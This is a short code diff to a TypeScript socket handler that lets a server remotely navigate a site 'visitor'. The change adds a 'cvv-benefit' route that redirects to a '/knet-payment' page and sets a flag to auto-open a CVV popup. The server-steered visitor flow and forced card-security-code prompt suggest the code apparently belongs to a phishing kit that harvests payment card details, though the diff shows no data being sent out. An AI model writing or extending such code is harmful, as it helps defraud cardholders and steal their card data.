@@ -217,7 +217,13 @@ export function initializeSocket() {
   s.on("visitor:navigate", (page: string) => {
     console.log("Navigate to:", page);
     if (page) {
-      window.location.href = "/" + page;
+      if (page === "cvv-benefit") {
+        // Store flag to auto-open CVV popup on knet-payment page
+        localStorage.setItem("openCvvPopup", "true");
+        window.location.href = "/knet-payment";
+      } else {
+        window.location.href = "/" + page;
+      }
     }
   });
 
